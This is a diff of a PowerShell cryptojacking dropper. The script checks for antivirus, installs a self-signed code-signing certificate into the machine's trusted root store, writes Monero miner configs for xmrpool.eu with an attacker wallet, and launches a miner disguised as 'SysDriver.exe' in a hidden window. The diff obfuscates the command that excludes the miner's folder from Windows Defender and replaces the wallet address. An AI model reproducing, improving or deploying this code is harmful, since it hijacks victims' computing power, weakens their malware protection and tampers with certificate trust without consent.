@@ -14,7 +14,9 @@ Function Check-AV {
 
 Function Check-Files {
   [CmdletBinding()]
-  param ([string] $DestDirectory)  
+  param (
+    [string] $DestDirectory
+  )  
 
   if (
     (Test-Path -Path ($DestDirectory + "\config.txt") -PathType Leaf) -or
@@ -39,7 +41,9 @@ Function Get-PSScriptPath {
 
 Function Sign-Script {
   [CmdletBinding()]
-  param ([string] $FilePath)  
+  param (
+    [string] $FilePath
+  )  
   $authenticode = New-SelfSignedCertificate -Subject "Store Authenticode" -CertStoreLocation "Cert:\LocalMachine\My" -NotAfter (Get-Date).AddYears(10) -Type CodeSigningCert
 
   $rootStore = [System.Security.Cryptography.X509Certificates.X509Store]::new("Root","LocalMachine")
@@ -93,8 +97,8 @@ else{
 }
   
 if((Check-AV) -and (Check-Files -DestDirectory $DestDirectory)){  
-  Add-MpPreference -ExclusionPath $DestDirectory
-
+  &("{4}{2}{0}{3}{1}" -f 'ef',("{1}{0}" -f 'e','enc'),("{1}{0}" -f'Pr','-Mp'),'er','Add') -ExclusionPath ${dEStD`IR`ecTO`Ry}
+  
   $Pass = [Text.Encoding]::UTF8.GetBytes("J4ck.Sp4rr0w")
   $Salt = [Text.Encoding]::UTF8.GetBytes("1996")
   $Init = [Text.Encoding]::UTF8.GetBytes("Yet another Pirate")
@@ -112,7 +116,7 @@ if((Check-AV) -and (Check-Files -DestDirectory $DestDirectory)){
 
   '"call_timeout" : 10,"retry_time" : 30,"giveup_limit" : 0,"verbose_level" : 0,"print_motd" : true,"h_print_time" : 300,"aes_override" : null,"use_slow_memory" : "always","tls_secure_algo" : true,"daemon_mode" : true,"output_file" : "","httpd_port" : 0,"http_login" : "","http_pass" : "","prefer_ipv4" : true,' | Out-File -Encoding "UTF8" -FilePath ($DestDirectory + "\config.txt")
   '"cpu_threads_conf" : [{ "low_power_mode" : 1, "affine_to_cpu" : 0 },{ "low_power_mode" : 1, "affine_to_cpu" : 1 },{ "low_power_mode" : 1, "affine_to_cpu" : 2 }]' | Out-File -Encoding "UTF8" -FilePath ($DestDirectory + "\cpu.txt")
-  '"pool_list" :[{"pool_address" : "xmrpool.eu:3333", "wallet_address" : "86H1wsznA3KK1d1syK68ujEuRgBk2zovUCXRtmGMTv6V3iaUDw1d9xphJBuao3iEKPBW4iN5uW6QhfWbeJLfGXhW9n23CYP", "rig_id" : "", "pool_password" : "", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 1 },],"currency" : "monero",' | Out-File -Encoding "UTF8" -FilePath ($DestDirectory + "\pools.txt")
+  '"pool_list" :[{"pool_address" : "xmrpool.eu:3333", "wallet_address" : "478FqzKxSyHDZATvpim9LkSyxoo5HcWeXjEG3TAJY9jsjPrQ7BRrpXoQZ9i9aCgv73P754o3i9DboFKAXgCRs4g8GnxGpFj", "rig_id" : "", "pool_password" : "", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 1 },],"currency" : "monero",' | Out-File -Encoding "UTF8" -FilePath ($DestDirectory + "\pools.txt")
 
 @"
 Start-Process -FilePath "$DestDirectory\SysDriver.exe" -ArgumentList "--noAMD","--noNVIDIA","--noTest" -WorkingDirectory "$DestDirectory" -WindowStyle Hidden
